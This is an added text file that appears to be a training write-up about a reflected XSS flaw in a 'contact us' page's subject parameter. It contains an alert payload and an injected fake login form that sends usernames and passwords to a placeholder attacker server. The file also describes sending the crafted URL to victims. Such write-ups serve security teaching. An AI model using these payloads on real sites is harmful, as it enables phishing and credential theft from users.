@@ -1,0 +1,25 @@
+The XSS vulnerability on our website is located in the 'contact us' page.
+When sumbitting a message, the message and subject you entered are being sent as url parameters, and a message saying
+'Your message about <your_message> have been sent successully" is displayed.
+
+This message overrides the html of the <div> that contains it, not the text.
+
+So when you enter html elements as the subject, they are being interpreted as actual html elements.
+
+Try printing an alert to the screen:
+<script>alert(1)</script>
+
+and we can go bigger. Let's add some fields to the form:
+
+<h3>Please login to proceed</h3><form action=http://your.remote.evil.server>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
+
+You can see that the fields ask for username and password, and that the answer will be sent to our server.
+
+*Notice that the subject is being encoded in URL format, so you may need to fix the spaces
+
+So how can we actually exploit this vulnerability?
+Because the subject is being added to the URL, an attacker can send the URL!
+
+There are a lot of great attacks to do when a website is vulnerable to XSS - stealing cookies, stealing user credentials, and a lot more.
+This great post show some practical scenarios for XSS attack:
+https://pentest-tools.com/blog/xss-attacks-practical-scenarios/
